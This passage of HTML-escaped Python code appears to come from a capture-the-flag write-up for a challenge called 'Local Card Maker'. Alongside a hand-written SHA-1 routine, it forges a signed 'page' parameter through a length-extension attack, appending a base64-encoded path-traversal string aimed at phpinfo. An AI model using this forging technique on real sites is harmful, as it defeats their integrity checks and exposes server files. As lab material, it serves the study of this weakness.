&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;                f &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;b &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;^ &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;c &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;^ &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;d
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;                k &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;0xCA62C1D6
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;            temp &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;add([rotl(a, &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;5&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;), f, e, k, w[i]])
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;            e &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;d
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;            d &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;c
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;            c &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;rotl(b, &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;30&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;)
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;            b &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;a
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;            a &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;temp
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;        h0 &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;add([h0, a])
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;        h1 &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;add([h1, b])
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;        h2 &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;add([h2, c])
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;        h3 &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;add([h3, d])
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;        h4 &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;add([h4, e])
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;return &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;(h0, h1, h2, h3, h4)
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;def &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#8ec07c;&amp;quot;&amp;gt;pad&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;msg&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;, &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;sz &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;None&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;):
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;if &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;sz &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;== &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;None&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;:
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;        sz &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;len&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;(msg)
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    bits &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;sz &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;* &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;8
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    padding &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;512 &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;- &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;((bits &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;+ &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;8&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;) &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;% &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;512&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;) &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;- &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;64
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    msg &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;+= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;b&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;\x80&amp;amp;quot;  &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-style:italic;color:#928374;&amp;quot;&amp;gt;# append bit &amp;amp;quot;1&amp;amp;quot;, and a few zeros.
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;return &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;msg &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;+ &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;int&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;(padding &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;&amp;#x2F; &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;8&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;) &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;* &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;b&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;\x00&amp;amp;quot; &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;+ &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;struct.pack(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;&amp;amp;gt;q&amp;amp;quot;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;, bits)  &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-style:italic;color:#928374;&amp;quot;&amp;gt;# don&amp;amp;#39;t count the \x80 here, hence the -8.
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;def &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#8ec07c;&amp;quot;&amp;gt;sha1&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;msg&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;):
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-style:italic;color:#928374;&amp;quot;&amp;gt;# These are the constants in a standard SHA-1
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;return &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;sha1_impl(pad(msg), &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;0x67452301 &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;, &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;0xefcdab89 &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;, &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;0x98badcfe &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;, &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;0x10325476 &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;, &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;0xc3d2e1f0&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;)
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-style:italic;color:#928374;&amp;quot;&amp;gt;# &amp;amp;quot;Local Card Maker&amp;amp;quot;-specific implementation starts here:
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;def &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#8ec07c;&amp;quot;&amp;gt;sha1_bytes_to_str&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;result&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;):
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;return &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;&amp;amp;#39;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;.join([&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;hex&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;(x)[&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;2&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;:].zfill(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;2&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;) &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;for &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;x &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;in &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;result])
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;def &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#8ec07c;&amp;quot;&amp;gt;get_h_values&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;hash_string&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;):
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-style:italic;color:#928374;&amp;quot;&amp;gt;# Divide hash_string to 5 ints, 4 bytes each
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;return &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;[&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;int&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;(hash_string[i&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;*&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;8&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;:(i&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;+&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;1&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;)&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;*&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;8&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;], &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;16&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;) &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;for &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;i &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;in &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;range&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;5&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;)&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;]
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-style:italic;color:#928374;&amp;quot;&amp;gt;# &amp;amp;quot;view_profile&amp;amp;quot; taken from site (&amp;amp;quot;page&amp;amp;quot; query parameter)
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;block_1_buf &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;b&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;dmlld19wcm9maWxl&amp;amp;quot;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-style:italic;color:#928374;&amp;quot;&amp;gt;# Hash taken from site (&amp;amp;quot;pHash&amp;amp;quot; query parameter)
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;block_1_hash &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;b&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;7b6f8b016f25da478b9f28f878aa3be8cced66fd&amp;amp;quot;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;block_1_h_values &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;get_h_values(block_1_hash)
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-style:italic;color:#928374;&amp;quot;&amp;gt;# taken from description of challenge
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;salt_len &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;23
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-style:italic;color:#928374;&amp;quot;&amp;gt;# &amp;amp;quot;aaa&amp;amp;quot; is padding, since the previous SHA-1 block contains the length at the end which is parsed by PHP as Base64 data.
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-style:italic;color:#928374;&amp;quot;&amp;gt;# I align to 4 bytes in order for the appended path to be parsed correctly.
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;block_2_buf &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;b&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;aaa&amp;amp;quot; &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;+ &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;base64.encodebytes(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;b&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;&amp;#x2F;..&amp;#x2F;.&amp;#x2F;.&amp;#x2F;.&amp;#x2F;.&amp;#x2F;.&amp;#x2F;.&amp;#x2F;.&amp;#x2F;phpinfo&amp;amp;quot;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;).replace(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;b&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;\n&amp;amp;quot;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;, &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;b&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;&amp;amp;quot;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;)
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-style:italic;color:#928374;&amp;quot;&amp;gt;# Pad this second block, use a custom size with additional 64 bytes to account for the first block (which is always padded to 64)
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;block_2_buf_padded &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;pad(block_2_buf, &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;len&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;(block_2_buf) &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;+ &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;64&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;)
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;joined_buf_hash &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;sha1_bytes_to_str(sha1_impl(block_2_buf_padded, &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;*&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;block_1_h_values))
